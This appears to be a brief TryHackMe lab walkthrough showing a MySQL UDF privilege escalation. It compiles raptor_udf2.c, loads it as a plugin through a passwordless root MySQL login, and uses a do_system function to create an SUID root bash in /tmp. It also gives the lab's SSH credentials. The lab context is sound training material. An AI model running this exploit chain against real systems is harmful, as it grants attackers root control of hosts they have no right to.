# TRYHACKME : Linux PrivEsc
Deploy the target machine, and enter the following ssh credentials: `user:password321`

## Service Exploits
Simply copy in consecutive order the ff commands:
```
cd /home/user/tools/mysql-udf
```
Compiler the following file `raptor_udf2.c`
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the mysql with no password:
```
mysql -u root
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
whoami  // voila root access
```
